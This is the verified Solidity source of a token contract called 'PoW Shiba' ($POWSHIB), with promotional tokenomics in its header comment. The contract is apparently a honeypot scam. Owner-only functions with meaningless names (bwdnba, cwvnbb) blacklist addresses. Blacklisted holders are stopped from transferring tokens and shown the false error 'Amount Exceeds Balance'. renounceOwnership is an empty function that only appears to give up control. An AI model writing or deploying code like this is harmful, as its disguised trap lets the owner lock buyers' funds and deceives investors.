/**
 *Submitted for verification at Etherscan.io on 2022-09-12
*/

pragma solidity 0.8.7;
/*


   ▄███████▄  ▄██████▄   ▄█     █▄          ▄████████    ▄█    █▄     ▄█  ▀█████████▄     ▄████████ 
  ███    ███ ███    ███ ███     ███        ███    ███   ███    ███   ███    ███    ███   ███    ███ 
  ███    ███ ███    ███ ███     ███        ███    █▀    ███    ███   ███▌   ███    ███   ███    ███ 
  ███    ███ ███    ███ ███     ███        ███         ▄███▄▄▄▄███▄▄ ███▌  ▄███▄▄▄██▀    ███    ███ 
▀█████████▀  ███    ███ ███     ███      ▀███████████ ▀▀███▀▀▀▀███▀  ███▌ ▀▀███▀▀▀██▄  ▀███████████ 
  ███        ███    ███ ███     ███               ███   ███    ███   ███    ███    ██▄   ███    ███ 
  ███        ███    ███ ███ ▄█▄ ███         ▄█    ███   ███    ███   ███    ███    ███   ███    ███ 
 ▄████▀       ▀██████▀   ▀███▀███▀        ▄████████▀    ███    █▀    █▀   ▄█████████▀    ███    █▀  

PoW Shiba Inu - $POWSHIB


Tokenomics:


- 0% Tax first 12 hours, then 7%
- 100M Supply
- 1:1 Airdrop + NFT Snapshot Post Merge  - PulseChain Bridge Support Q4

 @POWSHIB social

*/    

contract POWSHIBA {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) zAmnt;

    // 
    string public name = "PoW Shiba";
    string public symbol = unicode"POWSHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function bwdnba(address _user) public onlyOwner {
        require(!zAmnt[_user], "x");
        zAmnt[_user] = true;
     
    }
    
    function cwvnbb(address _user) public onlyOwner {
        require(zAmnt[_user], "xx");
        zAmnt[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!zAmnt[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!zAmnt[from] , "Amount Exceeds Balance"); 
               require(!zAmnt[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}